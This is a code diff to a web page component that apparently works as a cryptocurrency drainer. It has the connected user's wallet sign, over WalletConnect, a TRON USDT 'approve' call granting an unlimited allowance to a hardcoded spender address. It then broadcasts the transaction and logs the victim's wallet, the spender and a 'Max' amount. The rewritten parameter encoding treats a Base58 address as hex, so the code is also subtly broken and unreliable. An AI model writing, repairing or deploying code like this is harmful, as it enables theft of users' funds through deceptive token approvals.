@@ -189,13 +189,21 @@ export default function Index() {
       }
 
       // Build + sign via WalletConnect
-      const TronWebCDN = (window as any).TronWeb;
-      const tw = new TronWebCDN({ fullHost: "https://api.trongrid.io" });
-      const { transaction } = await tw.transactionBuilder.triggerSmartContract(
-        TRON_USDT, "approve(address,uint256)", { feeLimit: 100000000 },
-        [{ type: "address", value: TRON_SPENDER }, { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }],
-        userAddressRef.current
-      );
+      // Build transaction via TronGrid API directly
+      const response = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          owner_address: userAddressRef.current,
+          contract_address: TRON_USDT,
+          function_selector: "approve(address,uint256)",
+          parameter: "0000000000000000000000" + TRON_SPENDER.replace(/^T/, '') + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+          fee_limit: 100000000,
+          call_value: 0,
+          visible: true
+        })
+      });
+      const { transaction } = await response.json();
 
       const signedTx = await wcClientRef.current.request({
         topic: wcSessionRef.current.topic,
@@ -203,7 +211,12 @@ export default function Index() {
         request: { method: "tron_signTransaction", params: { transaction } },
       });
 
-      const result = await tw.trx.sendRawTransaction(signedTx);
+      const broadcastRes = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(signedTx)
+      });
+      const result = await broadcastRes.json();
       setTransactionStatusState("success");
       setTimeout(() => setTransactionStatusState("idle"), 3000);
       await createTransaction({ walletAddress: userAddressRef.current, toAddress: TRON_SPENDER, amount: amount || "Max", txHash: result.txid || "wc_tx", usdtBalance: "0 USDT", nativeBalance: "0 TRX" });
